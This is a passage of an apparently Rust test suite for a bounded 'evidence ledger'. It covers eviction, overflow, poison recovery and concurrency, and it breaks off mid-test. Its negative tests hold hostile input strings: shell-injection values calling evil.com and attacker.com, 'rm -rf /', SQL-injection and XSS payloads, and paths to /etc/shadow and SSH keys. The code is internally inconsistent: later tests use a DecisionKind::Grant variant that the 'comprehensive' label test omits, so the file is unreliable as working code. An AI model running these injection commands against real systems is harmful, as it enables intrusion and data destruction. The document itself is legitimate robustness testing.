// Comprehensive conformance tests for evidence ledger - security and robustness
//
// Tests focus on:
// - Integer overflow/underflow protection in counters and size calculations
// - Memory exhaustion protection via bounded ring buffer
// - Thread safety and poison recovery scenarios
// - Size estimation accuracy and edge cases
// - Concurrent access patterns and race conditions
// - Serialization robustness

use super::evidence_ledger::*;
use std::sync::Arc;
use std::thread;
use std::io::{self, Write};

/// Test integer overflow protection in counters and IDs
#[test]
fn test_counter_overflow_protection() {
    // Create ledger and manually set counters near overflow to test protection
    let capacity = LedgerCapacity::new(10, 10000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Test that large counter values don't cause issues
    // We can't directly set the counters, but we can verify the math works

    // Create entries and verify counters use saturating arithmetic
    for i in 0..20 {
        let entry = test_entry(&format!("test-{}", i), i);
        let result = ledger.append(entry);
        assert!(result.is_ok(), "Should handle normal append operations");
    }

    // Verify totals are reasonable and didn't overflow
    assert!(ledger.total_appended() > 0);
    assert!(ledger.total_evicted() > 0);
    assert!(ledger.total_appended() >= ledger.total_evicted());

    // The ring buffer should maintain reasonable size
    assert!(ledger.len() <= 10, "Ring buffer should be bounded by max_entries");
}

/// Test entry ID sequence overflow protection
#[test]
fn test_entry_id_sequence_protection() {
    let capacity = LedgerCapacity::new(5, 10000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Add many entries to test ID sequence behavior
    let mut last_id = EntryId(0);

    for i in 0..1000 {
        let entry = test_entry(&format!("seq-test-{}", i), i);
        let id = ledger.append(entry).unwrap();

        // IDs should be monotonically increasing
        assert!(id > last_id, "Entry IDs should be monotonically increasing");
        last_id = id;

        // Should never wrap around or become zero
        assert!(id.0 > 0, "Entry IDs should never be zero");
    }
}

/// Test size estimation accuracy and edge cases
#[test]
fn test_size_estimation_edge_cases() {
    // Test size estimation with various payload sizes
    let small_entry = test_entry("small", 1);
    let small_size = small_entry.estimated_size();
    assert!(small_size > 0, "Size estimate should be positive");
    assert!(small_size < 1000, "Small entry should have reasonable size");

    // Test with very large payload
    let large_payload = serde_json::json!({
        "large_data": "x".repeat(10000),
        "more_data": vec![1; 1000],
        "nested": {
            "deep": {
                "very_deep": "y".repeat(5000)
            }
        }
    });

    let large_entry = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "large-test".to_string(),
        decision_kind: DecisionKind::Deny,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 1000,
        trace_id: "trace-large".to_string(),
        epoch_id: 1,
        payload: large_payload,
        size_bytes: 0,
    };

    let large_size = large_entry.estimated_size();
    assert!(large_size > small_size, "Large entry should have larger size estimate");
    assert!(large_size > 15000, "Large entry should reflect actual size");

    // Test with invalid JSON that might cause serialization to fail
    // The estimated_size function should handle this gracefully with unwrap_or(256)
    let mut problematic_entry = test_entry("problematic", 1);

    // Create a payload that could cause serialization issues
    let mut problematic_map = serde_json::Map::new();
    problematic_map.insert("valid".to_string(), serde_json::Value::String("test".to_string()));
    problematic_entry.payload = serde_json::Value::Object(problematic_map);

    let size = problematic_entry.estimated_size();
    assert!(size >= 256, "Should use fallback size for estimation problems");
}

/// Test memory exhaustion protection via bounded storage
#[test]
fn test_memory_exhaustion_protection() {
    // Create a very small capacity ledger to force frequent evictions
    let capacity = LedgerCapacity::new(3, 500);
    let mut ledger = EvidenceLedger::new(capacity);

    // Add many entries to test memory bounds
    for i in 0..100 {
        let entry = test_entry(&format!("mem-test-{}", i), i);
        let result = ledger.append(entry);

        // Should always succeed with bounded storage
        assert!(result.is_ok(), "Bounded ledger should handle memory pressure");

        // Should never exceed capacity limits
        assert!(ledger.len() <= 3, "Should never exceed max_entries");
        assert!(ledger.current_bytes() <= 500, "Should never exceed max_bytes");
    }

    // Should have evicted many entries
    assert!(ledger.total_evicted() > 90, "Should have evicted many entries");
    assert_eq!(ledger.len(), 3, "Should maintain exactly max_entries");
}

/// Test concurrent access and thread safety
#[test]
fn test_concurrent_access_thread_safety() {
    let shared_ledger = SharedEvidenceLedger::new(LedgerCapacity::new(1000, 100000));
    let num_threads = 10;
    let entries_per_thread = 20;

    let mut handles = Vec::new();

    // Spawn multiple threads that append concurrently
    for thread_id in 0..num_threads {
        let ledger_clone = shared_ledger.clone();
        let handle = thread::spawn(move || {
            for i in 0..entries_per_thread {
                let entry = test_entry(&format!("thread-{}-entry-{}", thread_id, i),
                                     (thread_id * entries_per_thread + i) as u64);
                let result = ledger_clone.append(entry);
                assert!(result.is_ok(), "Concurrent append should succeed");
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().expect("Thread should complete successfully");
    }

    // Verify final state
    let final_count = shared_ledger.len();
    let snapshot = shared_ledger.snapshot();

    assert!(final_count <= 1000, "Should not exceed capacity");
    assert_eq!(snapshot.entries.len(), final_count);
    assert_eq!(snapshot.total_appended, (num_threads * entries_per_thread) as u64);
}

/// Test poison recovery in shared ledger
#[test]
fn test_poison_recovery() {
    let shared_ledger = SharedEvidenceLedger::new(LedgerCapacity::new(100, 10000));

    // First verify normal operation
    assert!(shared_ledger.is_empty());

    let poison_target = shared_ledger.clone();

    // Create a thread that will poison the mutex
    let poison_handle = thread::spawn(move || {
        let _guard = poison_target.inner.lock().expect("Should acquire lock");
        panic!("Intentionally poison the mutex");
    });

    // Wait for the thread to panic and poison the mutex
    assert!(poison_handle.join().is_err(), "Poisoning thread should panic");

    // Now verify that the ledger can recover from the poison
    assert!(shared_ledger.is_empty(), "Should recover from poison and still work");

    let result = shared_ledger.append(test_entry("post-poison", 1));
    assert!(result.is_ok(), "Should be able to append after poison recovery");

    assert_eq!(shared_ledger.len(), 1, "Should work normally after recovery");

    let snapshot = shared_ledger.snapshot();
    assert_eq!(snapshot.entries.len(), 1, "Snapshot should work after recovery");
}

/// Test capacity validation edge cases
#[test]
fn test_capacity_validation_edge_cases() {
    // Test zero entry capacity
    let zero_capacity = LedgerCapacity::new(0, 1000);
    let mut ledger = EvidenceLedger::new(zero_capacity);

    let result = ledger.append(test_entry("zero-cap", 1));
    assert!(matches!(result, Err(LedgerError::ZeroEntryCapacity)));
    assert!(ledger.is_empty());
    assert_eq!(ledger.total_appended(), 0);

    // Test zero byte capacity
    let zero_bytes = LedgerCapacity::new(10, 0);
    let mut byte_ledger = EvidenceLedger::new(zero_bytes);

    let result = byte_ledger.append(test_entry("zero-bytes", 1));
    // Should fail because even a small entry exceeds 0 byte limit
    assert!(result.is_err());

    // Test very large capacity values
    let huge_capacity = LedgerCapacity::new(usize::MAX, usize::MAX);
    let mut huge_ledger = EvidenceLedger::new(huge_capacity);

    let result = huge_ledger.append(test_entry("huge-cap", 1));
    assert!(result.is_ok(), "Should handle very large capacity values");
}

/// Test entry size vs byte limit validation
#[test]
fn test_entry_size_byte_limit_validation() {
    let capacity = LedgerCapacity::new(10, 100); // Very small byte limit
    let mut ledger = EvidenceLedger::new(capacity);

    // Create an entry that's definitely too large
    let large_payload = serde_json::json!({
        "massive_string": "x".repeat(1000),
        "another_field": "y".repeat(1000)
    });

    let oversized_entry = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "oversized".to_string(),
        decision_kind: DecisionKind::Escalate,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 1000,
        trace_id: "trace-oversized".to_string(),
        epoch_id: 1,
        payload: large_payload,
        size_bytes: 0,
    };

    let result = ledger.append(oversized_entry);

    match result {
        Err(LedgerError::EntryTooLarge { entry_size, max_bytes }) => {
            assert!(entry_size > max_bytes);
            assert_eq!(max_bytes, 100);
        }
        _ => panic!("Expected EntryTooLarge error"),
    }

    // Ledger should remain unchanged
    assert!(ledger.is_empty());
    assert_eq!(ledger.total_appended(), 0);
}

/// Test eviction order and FIFO semantics
#[test]
fn test_eviction_order_fifo_semantics() {
    let capacity = LedgerCapacity::new(3, 10000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Add more entries than capacity to trigger evictions
    let entry_ids = ["first", "second", "third", "fourth", "fifth"];

    for (i, id) in entry_ids.iter().enumerate() {
        let entry = test_entry(id, i as u64);
        ledger.append(entry).expect("Should succeed");
    }

    // Should only have the last 3 entries (FIFO eviction)
    assert_eq!(ledger.len(), 3);
    assert_eq!(ledger.total_appended(), 5);
    assert_eq!(ledger.total_evicted(), 2);

    // Verify the remaining entries are the most recent ones
    let entries: Vec<_> = ledger.iter_all().collect();
    assert_eq!(entries[0].1.decision_id, "third");
    assert_eq!(entries[1].1.decision_id, "fourth");
    assert_eq!(entries[2].1.decision_id, "fifth");
}

/// Test iterator edge cases
#[test]
fn test_iterator_edge_cases() {
    let capacity = LedgerCapacity::new(5, 10000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Test iterators on empty ledger
    assert_eq!(ledger.iter_all().count(), 0);
    assert_eq!(ledger.iter_recent(10).count(), 0);
    assert_eq!(ledger.iter_recent(0).count(), 0);

    // Add some entries
    for i in 0..3 {
        ledger.append(test_entry(&format!("iter-{}", i), i)).unwrap();
    }

    // Test iter_recent with various values
    assert_eq!(ledger.iter_recent(0).count(), 0);
    assert_eq!(ledger.iter_recent(1).count(), 1);
    assert_eq!(ledger.iter_recent(2).count(), 2);
    assert_eq!(ledger.iter_recent(3).count(), 3);
    assert_eq!(ledger.iter_recent(10).count(), 3); // More than available

    // Verify iter_recent returns newest entries last
    let recent: Vec<_> = ledger.iter_recent(2).collect();
    assert_eq!(recent[0].1.decision_id, "iter-1");
    assert_eq!(recent[1].1.decision_id, "iter-2");
}

/// Test snapshot consistency and independence
#[test]
fn test_snapshot_consistency_independence() {
    let capacity = LedgerCapacity::new(5, 10000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Take snapshot of empty ledger
    let empty_snapshot = ledger.snapshot();
    assert_eq!(empty_snapshot.entries.len(), 0);
    assert_eq!(empty_snapshot.total_appended, 0);
    assert_eq!(empty_snapshot.total_evicted, 0);

    // Add entries
    ledger.append(test_entry("snap-1", 1)).unwrap();
    ledger.append(test_entry("snap-2", 2)).unwrap();

    let snapshot1 = ledger.snapshot();
    assert_eq!(snapshot1.entries.len(), 2);
    assert_eq!(snapshot1.total_appended, 2);

    // Modify ledger further
    ledger.append(test_entry("snap-3", 3)).unwrap();

    let snapshot2 = ledger.snapshot();
    assert_eq!(snapshot2.entries.len(), 3);
    assert_eq!(snapshot2.total_appended, 3);

    // Original snapshot should be unchanged
    assert_eq!(snapshot1.entries.len(), 2);
    assert_eq!(snapshot1.total_appended, 2);

    // Empty snapshot should still be empty
    assert_eq!(empty_snapshot.entries.len(), 0);
}

/// Test lab spill mode error handling
#[test]
fn test_lab_spill_error_handling() {
    // Test with failing writer
    struct AlwaysFailWriter;
    impl Write for AlwaysFailWriter {
        fn write(&mut self, _buf: &[u8]) -> io::Result<usize> {
            Err(io::Error::new(io::ErrorKind::PermissionDenied, "Write failed"))
        }
        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    let capacity = LedgerCapacity::new(10, 10000);
    let mut spill_mode = LabSpillMode::new(capacity, Box::new(AlwaysFailWriter));

    let result = spill_mode.append(test_entry("fail-test", 1));
    assert!(matches!(result, Err(LedgerError::SpillError { .. })));

    // Ledger should remain unmodified on spill failure
    assert!(spill_mode.is_empty());
    assert_eq!(spill_mode.snapshot().total_appended, 0);

    // Test with failing flush
    struct FailFlushWriter;
    impl Write for FailFlushWriter {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            Ok(buf.len())
        }
        fn flush(&mut self) -> io::Result<()> {
            Err(io::Error::new(io::ErrorKind::BrokenPipe, "Flush failed"))
        }
    }

    let mut spill_flush = LabSpillMode::new(
        LedgerCapacity::new(10, 10000),
        Box::new(FailFlushWriter)
    );

    let result = spill_flush.append(test_entry("flush-fail", 1));
    assert!(matches!(result, Err(LedgerError::SpillError { .. })));
    assert!(spill_flush.is_empty());
}

/// Test deterministic behavior under identical inputs
#[test]
fn test_deterministic_behavior() {
    // Run identical sequences in two separate ledgers
    let create_and_run = || {
        let capacity = LedgerCapacity::new(5, 10000);
        let mut ledger = EvidenceLedger::new(capacity);

        for i in 0..10 {
            let entry = test_entry(&format!("det-{}", i), i);
            ledger.append(entry).unwrap();
        }

        ledger.snapshot()
    };

    let snapshot1 = create_and_run();
    let snapshot2 = create_and_run();

    // Results should be identical
    assert_eq!(snapshot1.entries.len(), snapshot2.entries.len());
    assert_eq!(snapshot1.total_appended, snapshot2.total_appended);
    assert_eq!(snapshot1.total_evicted, snapshot2.total_evicted);
    assert_eq!(snapshot1.current_bytes, snapshot2.current_bytes);

    // Entry details should match
    for (entry1, entry2) in snapshot1.entries.iter().zip(snapshot2.entries.iter()) {
        assert_eq!(entry1.0, entry2.0); // EntryId
        assert_eq!(entry1.1.decision_id, entry2.1.decision_id);
        assert_eq!(entry1.1.epoch_id, entry2.1.epoch_id);
    }
}

/// Test byte accounting accuracy
#[test]
fn test_byte_accounting_accuracy() {
    let capacity = LedgerCapacity::new(10, 1000);
    let mut ledger = EvidenceLedger::new(capacity);

    let entry1 = test_entry("byte-test-1", 1);
    let entry1_size = entry1.estimated_size();

    ledger.append(entry1).unwrap();
    assert_eq!(ledger.current_bytes(), entry1_size);

    let entry2 = test_entry("byte-test-2", 2);
    let entry2_size = entry2.estimated_size();

    ledger.append(entry2).unwrap();
    assert_eq!(ledger.current_bytes(), entry1_size + entry2_size);

    // Force eviction by adding a large entry
    let large_entry = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "large".to_string(),
        decision_kind: DecisionKind::Throttle,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 3000,
        trace_id: "trace-large".to_string(),
        epoch_id: 3,
        payload: serde_json::json!({"data": "x".repeat(500)}),
        size_bytes: 0,
    };

    ledger.append(large_entry.clone()).unwrap();

    // Bytes should be accurately tracked after evictions
    assert!(ledger.current_bytes() <= 1000);
    assert!(ledger.current_bytes() > 0);
}

/// Custom test for ID display formatting
#[test]
fn test_entry_id_display_formatting() {
    assert_eq!(format!("{}", EntryId(1)), "E-00000001");
    assert_eq!(format!("{}", EntryId(42)), "E-00000042");
    assert_eq!(format!("{}", EntryId(123456)), "E-00123456");
    assert_eq!(format!("{}", EntryId(u64::MAX)), format!("E-{:08}", u64::MAX));
}

/// Test decision kind labels
#[test]
fn test_decision_kind_labels_comprehensive() {
    let kinds = [
        (DecisionKind::Admit, "admit"),
        (DecisionKind::Deny, "deny"),
        (DecisionKind::Quarantine, "quarantine"),
        (DecisionKind::Release, "release"),
        (DecisionKind::Rollback, "rollback"),
        (DecisionKind::Throttle, "throttle"),
        (DecisionKind::Escalate, "escalate"),
    ];

    for (kind, expected_label) in kinds.iter() {
        assert_eq!(kind.label(), *expected_label);
    }
}

/// Rejected shared-ledger appends must not mutate counters or retained entries.
#[test]
fn test_shared_zero_capacity_rejects_without_metrics_mutation() {
    let shared = SharedEvidenceLedger::new(LedgerCapacity::new(0, 10_000));

    let result = shared.append(test_entry("shared-zero-cap", 1));

    assert!(matches!(result, Err(LedgerError::ZeroEntryCapacity)));
    assert!(shared.is_empty());
    assert_eq!(shared.len(), 0);
    let metrics = shared.metrics();
    assert_eq!(metrics.total_appended, 0);
    assert_eq!(metrics.total_evicted, 0);
    assert_eq!(metrics.current_bytes, 0);
}

/// Oversized entries must be rejected without disturbing existing entries.
#[test]
fn test_oversized_append_preserves_existing_snapshot() {
    let mut ledger = EvidenceLedger::new(LedgerCapacity::new(5, 2_000));
    let first_id = ledger.append(test_entry("retained-before-reject", 1)).unwrap();
    let before = ledger.snapshot();

    let oversized = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "oversized-rejected".to_string(),
        decision_kind: DecisionKind::Escalate,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 2_000,
        trace_id: "trace-oversized-rejected".to_string(),
        epoch_id: 2,
        payload: serde_json::json!({"blob": "x".repeat(10_000)}),
        size_bytes: 0,
    };

    let result = ledger.append(oversized);

    assert!(matches!(result, Err(LedgerError::EntryTooLarge { .. })));
    let after = ledger.snapshot();
    assert_eq!(after.entries, before.entries);
    assert_eq!(after.total_appended, before.total_appended);
    assert_eq!(after.total_evicted, before.total_evicted);
    assert_eq!(after.current_bytes, before.current_bytes);
    assert_eq!(after.entries[0].0, first_id);
}

/// Failed appends must not consume entry IDs or increment appended counters.
#[test]
fn test_rejected_append_does_not_advance_next_successful_id() {
    let mut ledger = EvidenceLedger::new(LedgerCapacity::new(10, 2_000));
    let first = ledger.append(test_entry("id-before-reject", 1)).unwrap();

    let oversized = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "id-reject".to_string(),
        decision_kind: DecisionKind::Deny,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 2_000,
        trace_id: "trace-id-reject".to_string(),
        epoch_id: 2,
        payload: serde_json::json!({"blob": "y".repeat(8_000)}),
        size_bytes: 0,
    };

    assert!(ledger.append(oversized).is_err());
    let second = ledger.append(test_entry("id-after-reject", 3)).unwrap();

    assert_eq!(first, EntryId(1));
    assert_eq!(second, EntryId(2));
    assert_eq!(ledger.total_appended(), 2);
    assert_eq!(ledger.len(), 2);
}

#[derive(Clone)]
struct CountingWriter {
    writes: Arc<std::sync::Mutex<usize>>,
}

impl Write for CountingWriter {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        let mut writes = self.writes.lock().unwrap();
        *writes = (*writes).saturating_add(1);
        Ok(buf.len())
    }

    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

/// Zero entry capacity should fail before the spill writer is touched.
#[test]
fn test_lab_spill_zero_capacity_rejects_before_write() {
    let writes = Arc::new(std::sync::Mutex::new(0));
    let writer = CountingWriter {
        writes: writes.clone(),
    };
    let mut spill = LabSpillMode::new(LedgerCapacity::new(0, 10_000), Box::new(writer));

    let result = spill.append(test_entry("spill-zero-cap", 1));

    assert!(matches!(result, Err(LedgerError::ZeroEntryCapacity)));
    assert_eq!(*writes.lock().unwrap(), 0);
    assert!(spill.is_empty());
}

/// Oversized spill entries should be rejected before any JSONL write occurs.
#[test]
fn test_lab_spill_oversized_entry_rejects_before_write() {
    let writes = Arc::new(std::sync::Mutex::new(0));
    let writer = CountingWriter {
        writes: writes.clone(),
    };
    let mut spill = LabSpillMode::new(LedgerCapacity::new(5, 500), Box::new(writer));
    let oversized = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "spill-oversized".to_string(),
        decision_kind: DecisionKind::Rollback,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 3_000,
        trace_id: "trace-spill-oversized".to_string(),
        epoch_id: 3,
        payload: serde_json::json!({"blob": "z".repeat(5_000)}),
        size_bytes: 0,
    };

    let result = spill.append(oversized);

    assert!(matches!(result, Err(LedgerError::EntryTooLarge { .. })));
    assert_eq!(*writes.lock().unwrap(), 0);
    assert!(spill.is_empty());
    assert_eq!(spill.metrics().total_appended, 0);
}

/// Failed byte-limit appends should not appear through recent iterators.
#[test]
fn test_iter_recent_omits_rejected_entry_after_byte_limit_failure() {
    let mut ledger = EvidenceLedger::new(LedgerCapacity::new(3, 2_000));
    ledger.append(test_entry("visible-1", 1)).unwrap();
    ledger.append(test_entry("visible-2", 2)).unwrap();
    let oversized = EvidenceEntry {
        schema_version: "1.0".to_string(),
        entry_id: None,
        decision_id: "hidden-rejected".to_string(),
        decision_kind: DecisionKind::Throttle,
        decision_time: "2026-02-20T12:00:00Z".to_string(),
        timestamp_ms: 4_000,
        trace_id: "trace-hidden-rejected".to_string(),
        epoch_id: 4,
        payload: serde_json::json!({"blob": "q".repeat(8_000)}),
        size_bytes: 0,
    };

    assert!(ledger.append(oversized).is_err());
    let recent: Vec<_> = ledger.iter_recent(3).collect();

    assert_eq!(recent.len(), 2);
    assert_eq!(recent[0].1.decision_id, "visible-1");
    assert_eq!(recent[1].1.decision_id, "visible-2");
    assert!(recent
        .iter()
        .all(|(_, entry, _)| entry.decision_id != "hidden-rejected"));
}

// -- Negative-Path Tests --

/// Test malformed evidence entry injection attacks and Unicode handling
#[test]
fn negative_malformed_evidence_entry_injection_attacks() {
    let capacity = LedgerCapacity::new(10, 50000);
    let mut ledger = EvidenceLedger::new(capacity);

    // Test entries with malicious content injection
    let malicious_entries = vec![
        // Unicode injection in various fields
        EvidenceEntry {
            schema_version: "1.0🚀attack".to_string(),
            entry_id: None,
            decision_id: "decision🔥火攻击кибер".to_string(),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z🌍".to_string(),
            timestamp_ms: 1000,
            trace_id: "trace\u{200B}invisible\u{FEFF}bom".to_string(),
            epoch_id: 1,
            payload: serde_json::json!({
                "malicious": "payload\0null\r\ninjection",
                "unicode": "权限🚀中文кириллица",
                "control_chars": "\x01\x02\x03\x1B[H\x1B[2J"
            }),
            size_bytes: 0,
        },

        // Control characters and null bytes
        EvidenceEntry {
            schema_version: "1.0\0null".to_string(),
            entry_id: None,
            decision_id: "decision\r\ncarriage\x01control".to_string(),
            decision_kind: DecisionKind::Deny,
            decision_time: "2026-02-20T12:00:00Z\x00".to_string(),
            timestamp_ms: 2000,
            trace_id: "trace\x1B[Hescape\x1B[2Jclear".to_string(),
            epoch_id: 2,
            payload: serde_json::json!({
                "binary_data": String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC]),
                "control_sequence": "\x1B[H\x1B[2J\r\n\x00\x01",
            }),
            size_bytes: 0,
        },

        // Script injection attempts
        EvidenceEntry {
            schema_version: "1.0'; DROP TABLE evidence; --".to_string(),
            entry_id: None,
            decision_id: "decision<script>alert('xss')</script>".to_string(),
            decision_kind: DecisionKind::Throttle,
            decision_time: "2026-02-20T12:00:00Z && curl evil.com".to_string(),
            timestamp_ms: 3000,
            trace_id: "trace'; rm -rf /; echo pwned".to_string(),
            epoch_id: 3,
            payload: serde_json::json!({
                "sql_injection": "'; DROP TABLE logs; --",
                "command_injection": "&& curl attacker.com",
                "xss_payload": "<script>alert('owned')</script>",
            }),
            size_bytes: 0,
        },

        // Path traversal attempts
        EvidenceEntry {
            schema_version: "../../../etc/passwd".to_string(),
            entry_id: None,
            decision_id: "../../../../proc/version".to_string(),
            decision_kind: DecisionKind::Escalate,
            decision_time: "../../bin/sh".to_string(),
            timestamp_ms: 4000,
            trace_id: "../../../root/.ssh/id_rsa".to_string(),
            epoch_id: 4,
            payload: serde_json::json!({
                "path_traversal": "../../../etc/shadow",
                "proc_access": "/proc/self/environ",
                "config_access": "../../config/secrets.json",
            }),
            size_bytes: 0,
        },

        // Extremely long field values (potential buffer overflow)
        EvidenceEntry {
            schema_version: "x".repeat(100_000),
            entry_id: None,
            decision_id: "y".repeat(500_000),
            decision_kind: DecisionKind::Rollback,
            decision_time: "z".repeat(50_000),
            timestamp_ms: 5000,
            trace_id: "a".repeat(200_000),
            epoch_id: 5,
            payload: serde_json::json!({
                "massive_field": "b".repeat(1_000_000),
                "huge_array": vec!["c".repeat(10_000); 100],
            }),
            size_bytes: 0,
        },
    ];

    for (i, malicious_entry) in malicious_entries.into_iter().enumerate() {
        let append_result = ledger.append(malicious_entry);

        match append_result {
            Ok(entry_id) => {
                // If entry was accepted, verify it doesn't corrupt ledger state
                assert!(entry_id.0 > 0, "Entry ID should be positive");

                // Verify ledger metrics remain consistent
                let metrics = ledger.metrics();
                assert!(metrics.total_appended > i as u64);
                assert!(metrics.current_bytes < u64::MAX);

                // Verify iteration doesn't crash with malicious content
                let all_entries: Vec<_> = ledger.iter_all().collect();
                assert!(all_entries.len() > 0);

                // Verify snapshot creation succeeds despite malicious content
                let snapshot = ledger.snapshot();
                assert!(snapshot.entries.len() <= 10);
            },
            Err(LedgerError::EntryTooLarge { .. }) => {
                // Expected for extremely large entries
            },
            Err(_) => {
                // Other validation errors are acceptable for malicious input
            }
        }
    }

    // Ledger should remain functional despite injection attempts
    let normal_entry = test_entry("normal-after-attacks", 1000);
    let normal_result = ledger.append(normal_entry);
    assert!(normal_result.is_ok(), "Ledger should remain functional after injection attempts");
}

/// Test extreme timestamp arithmetic overflow protection
#[test]
fn negative_extreme_timestamp_arithmetic_overflow_protection() {
    let capacity = LedgerCapacity::new(100, 50000);
    let mut ledger = EvidenceLedger::new(capacity);

    let extreme_timestamp_cases = vec![
        0,                              // Minimum timestamp
        1,                              // Just above minimum
        u64::MAX.saturating_sub(1000),  // Near maximum
        u64::MAX.saturating_sub(1),     // One below maximum
        u64::MAX,                       // Maximum timestamp
    ];

    for (i, extreme_timestamp) in extreme_timestamp_cases.iter().enumerate() {
        let extreme_entry = EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: format!("extreme-timestamp-{}", i),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: *extreme_timestamp,
            trace_id: format!("trace-extreme-{}", i),
            epoch_id: *extreme_timestamp,
            payload: serde_json::json!({
                "timestamp_test": extreme_timestamp,
                "epoch_test": extreme_timestamp,
            }),
            size_bytes: 0,
        };

        let append_result = ledger.append(extreme_entry);

        match append_result {
            Ok(entry_id) => {
                // If accepted, verify arithmetic operations don't overflow
                assert!(entry_id.0 > 0);

                // Test that iteration and snapshot work with extreme timestamps
                let snapshot = ledger.snapshot();
                for (_, entry, _) in &snapshot.entries {
                    // Verify timestamp fields don't cause arithmetic overflow
                    assert!(entry.timestamp_ms <= u64::MAX);
                    assert!(entry.epoch_id <= u64::MAX);
                }

                // Test recent iteration with extreme timestamps
                let recent: Vec<_> = ledger.iter_recent(5).collect();
                for (_, entry, _) in recent {
                    assert!(entry.timestamp_ms <= u64::MAX);
                }
            },
            Err(_) => {
                // Acceptable to reject extreme timestamp values
            }
        }
    }

    // Verify metrics remain consistent with extreme timestamps
    let final_metrics = ledger.metrics();
    assert!(final_metrics.total_appended < u64::MAX);
    assert!(final_metrics.current_bytes < u64::MAX);
    assert!(final_metrics.total_evicted < u64::MAX);
}

/// Test concurrent memory pressure and race conditions under extreme load
#[test]
fn negative_concurrent_memory_pressure_race_conditions() {
    let shared_ledger = SharedEvidenceLedger::new(LedgerCapacity::new(50, 10000));
    let num_stress_threads = 20;
    let operations_per_thread = 100;

    let success_count = Arc::new(std::sync::Mutex::new(0u64));
    let error_count = Arc::new(std::sync::Mutex::new(0u64));

    // Spawn many concurrent threads to stress test the ledger
    let mut stress_handles = Vec::new();

    for thread_id in 0..num_stress_threads {
        let ledger_clone = shared_ledger.clone();
        let success_count_clone = Arc::clone(&success_count);
        let error_count_clone = Arc::clone(&error_count);

        let handle = thread::spawn(move || {
            for operation_id in 0..operations_per_thread {
                // Create entries with varying sizes to stress memory management
                let payload_size = (operation_id % 10 + 1) * 1000; // 1KB to 10KB
                let large_payload = serde_json::json!({
                    "thread_id": thread_id,
                    "operation_id": operation_id,
                    "large_data": "x".repeat(payload_size),
                    "stress_test": true,
                });

                let stress_entry = EvidenceEntry {
                    schema_version: "1.0".to_string(),
                    entry_id: None,
                    decision_id: format!("stress-{}-{}", thread_id, operation_id),
                    decision_kind: match operation_id % 5 {
                        0 => DecisionKind::Grant,
                        1 => DecisionKind::Deny,
                        2 => DecisionKind::Throttle,
                        3 => DecisionKind::Escalate,
                        _ => DecisionKind::Rollback,
                    },
                    decision_time: "2026-02-20T12:00:00Z".to_string(),
                    timestamp_ms: 1000 + (thread_id * 1000 + operation_id) as u64,
                    trace_id: format!("trace-stress-{}-{}", thread_id, operation_id),
                    epoch_id: (thread_id + operation_id) as u64,
                    payload: large_payload,
                    size_bytes: 0,
                };

                let append_result = ledger_clone.append(stress_entry);

                match append_result {
                    Ok(_) => {
                        let mut count = success_count_clone.lock().unwrap();
                        *count = count.saturating_add(1);
                    },
                    Err(_) => {
                        let mut count = error_count_clone.lock().unwrap();
                        *count = count.saturating_add(1);
                    }
                }

                // Periodically check ledger state during stress test
                if operation_id % 20 == 0 {
                    let _is_empty = ledger_clone.is_empty();
                    let _len = ledger_clone.len();
                    let _metrics = ledger_clone.metrics();
                    // These operations should not panic under concurrent stress
                }
            }
        });

        stress_handles.push(handle);
    }

    // Wait for all stress threads to complete
    for handle in stress_handles {
        handle.join().expect("Stress thread should complete without panic");
    }

    let total_success = *success_count.lock().unwrap();
    let total_errors = *error_count.lock().unwrap();

    // Should handle concurrent operations without data corruption
    assert_eq!(total_success + total_errors, (num_stress_threads * operations_per_thread) as u64);

    // Ledger should remain in consistent state after stress test
    let final_snapshot = shared_ledger.snapshot();
    assert!(final_snapshot.entries.len() <= 50); // Should respect capacity
    assert!(final_snapshot.current_bytes <= 10000); // Should respect byte limit
    assert_eq!(final_snapshot.total_appended, total_success);

    // Should be able to operate normally after stress test
    let post_stress_entry = test_entry("post-stress-recovery", 999999);
    let recovery_result = shared_ledger.append(post_stress_entry);
    assert!(recovery_result.is_ok(), "Ledger should be functional after stress test");
}

/// Test capacity boundary manipulation and edge case validation
#[test]
fn negative_capacity_boundary_manipulation_edge_cases() {
    // Test zero capacity edge cases
    let zero_entry_capacity = LedgerCapacity::new(0, 10000);
    let zero_byte_capacity = LedgerCapacity::new(10, 0);
    let zero_both_capacity = LedgerCapacity::new(0, 0);

    let capacities = vec![
        ("zero_entries", zero_entry_capacity),
        ("zero_bytes", zero_byte_capacity),
        ("zero_both", zero_both_capacity),
    ];

    for (capacity_name, capacity) in capacities {
        let mut ledger = EvidenceLedger::new(capacity);

        let test_entry = EvidenceEntry {
            schema_version: "1.0".to_string(),
            entry_id: None,
            decision_id: format!("capacity-test-{}", capacity_name),
            decision_kind: DecisionKind::Grant,
            decision_time: "2026-02-20T12:00:00Z".to_string(),
            timestamp_ms: 1000,
